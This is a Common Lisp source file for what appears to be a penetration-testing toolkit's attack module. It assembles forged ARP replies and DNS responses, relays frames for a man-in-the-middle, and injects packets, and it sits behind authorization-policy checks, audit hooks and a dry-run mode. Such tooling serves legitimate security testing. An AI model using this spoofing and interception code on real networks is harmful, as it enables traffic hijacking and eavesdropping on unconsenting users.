(in-package #:nrecon.attack)

(defun %option (options key)
  (let ((string-key (string-downcase (symbol-name key))))
    (cond
      ((hash-table-p options)
       (or (gethash key options)
           (gethash string-key options)))
      ((listp options) (getf options key))
      (t nil))))

(defun %job-options (input)
  (if (typep input 'job)
      (job-options input)
      input))

(defun %context-option (context key)
  (%option context key))

(defun %json-string (string)
  (with-output-to-string (stream)
    (write-char #\" stream)
    (loop for character across string
          for code = (char-code character)
          do (case code
               (8 (write-string "\\b" stream))
               (9 (write-string "\\t" stream))
               (10 (write-string "\\n" stream))
               (12 (write-string "\\f" stream))
               (13 (write-string "\\r" stream))
               (34 (write-string "\\\"" stream))
               (92 (write-string "\\\\" stream))
               (otherwise
                (if (< code 32)
                    (format stream "\\u~4,'0X" code)
                    (write-char character stream)))))
    (write-char #\" stream)))

(defun render-attack-plan (action target policy packet-length)
  "Return a JSON dry-run plan. This function never opens or sends a packet."
  (check-type packet-length (integer 0 *))
  (let* ((decision (%decision policy action target))
         (host (nrecon.core:authorization-target-host target))
         (authorized (if (authorization-decision-allowed-p decision)
                         "true" "false"))
         (reason
           (%json-string
            (string-downcase
             (symbol-name (authorization-decision-reason decision))))))
    (format nil
            "{\"action\":~A,\"authorized\":~A,\"dry_run\":true,\"packet_length\":~D,\"reason\":~A,\"target\":~A}"
            (%json-string (%action-name action))
            authorized
            packet-length
            reason
            (if (stringp host) (%json-string host) "null"))))

(defun %packet-for-options (action options)
  (case action
    (:arp-spoof
     (build-arp-reply
      :source-mac (%option options :source-mac)
      :source-ip (%option options :spoofed-ip)
      :target-mac (%option options :target-mac)
      :target-ip (%option options :target-ip)))
    (:dns-spoof
     (build-dns-response-frame
      :source-mac (%option options :source-mac)
      :source-ip (%option options :spoofed-ip)
      :target-mac (%option options :target-mac)
      :target-ip (%option options :target-ip)
      :query-name (%option options :query-name)
      :identifier (or (%option options :identifier) 0)
      :source-port (or (%option options :source-port) 53)
      :destination-port (or (%option options :destination-port) 53000)
      :answer-ttl (or (%option options :answer-ttl) 60)
      :answer-ip (%option options :answer-ip)))
    (otherwise (error "Unsupported nrecon attack action: ~S." action))))

(defun run-mitm-relay (frame &key source-mac destination-mac interface-mac
                                    target-host (target-lab-p nil)
                                    authorization-policy audit-fn sender interface
                                    (timeout 1.0) deadline dry-run)
  "Relay supported untagged Ethernet II, unfragmented IPv4 TCP/UDP frames.
DNS payloads are opaque; authorization uses the outer IPv4 destination.
Reject ARP, IPv6, VLAN, IPv4 options/fragments, and malformed or unsupported
transport headers. TARGET-HOST, when supplied, must match that destination."
  (declare (ignore target-lab-p))
  (let* ((bytes (%check-octets frame))
         (expected-source (%mac-octets source-mac))
         (expected-destination (%mac-octets destination-mac)))
    (unless (and (>= (length bytes) 14)
                 (equalp (subseq bytes 0 6) expected-destination)
                 (equalp (subseq bytes 6 12) expected-source))
      (error "Captured frame MACs do not match the requested relay endpoints."))
    (let ((packet (rewrite-l2-frame bytes interface-mac destination-mac)))
      (multiple-value-bind (actual-host actual-octets)
          (%frame-destination-address packet)
        (when target-host
          (let ((requested-octets (%ipv4-literal-octets target-host)))
            (unless (and requested-octets
                         (equalp requested-octets actual-octets))
              (error "The supplied target host does not match the frame IPv4 destination."))))
        (let ((target
                (make-authorization-target
                 :host actual-host
                 :lab-p (%trusted-lab-destination-p authorization-policy
                                                    actual-octets))))
          (if dry-run
              (render-attack-plan :mitm-proxy target authorization-policy
                                  (length packet))
              (%send-packet packet :mitm-proxy target authorization-policy audit-fn
                            :sender sender :interface interface
                            :timeout timeout :deadline deadline)))))))

(defun run-attack (input context)
  "Run the attack described by INPUT using CONTEXT.
The :SENDER value in CONTEXT must be a trusted injection primitive that transmits
exactly the byte sequence it receives. Never supply an attacker-controlled value as
:SENDER."
  (let* ((options (%job-options input))
         (action (%option options :action))
         (target-host (or (%option options :target-ip)
                          (and (typep input 'job)
                               (nrecon.core:job-target input))))
         (policy (%context-option context :authorization-policy))
         (timeout (or (%option options :timeout) 1.0)))
    (if (eq action :mitm-proxy)
        (run-mitm-relay
         (%option options :frame)
         :source-mac (%option options :source-mac)
         :destination-mac (%option options :destination-mac)
         :interface-mac (%option options :interface-mac)
         :target-host target-host
         :authorization-policy policy
         :audit-fn (%context-option context :audit-fn)
         :sender (%context-option context :sender)
         :interface (%option options :interface)
         :timeout timeout
         :dry-run (%option options :dry-run))
        (let* ((target-octets (%ipv4-literal-octets target-host))
               (target-lab-p (%trusted-lab-destination-p policy target-octets))
               (target (make-authorization-target :host target-host
                                                  :lab-p target-lab-p))
               (packet (%packet-for-options action options)))
          (if (%option options :dry-run)
              (render-attack-plan action target policy (length packet))
              (%send-packet packet action target policy
                            (%context-option context :audit-fn)
                            :sender (%context-option context :sender)
                            :interface (%option options :interface)
                            :timeout timeout))))))

(define-module attack
  :capabilities (:arp-spoof :dns-spoof :mitm-proxy)
  :options (action target-ip target-mac source-mac spoofed-ip query-name
            identifier source-port destination-port answer-ttl answer-ip
            interface interface-mac destination-mac frame timeout dry-run)
  :run run-attack)
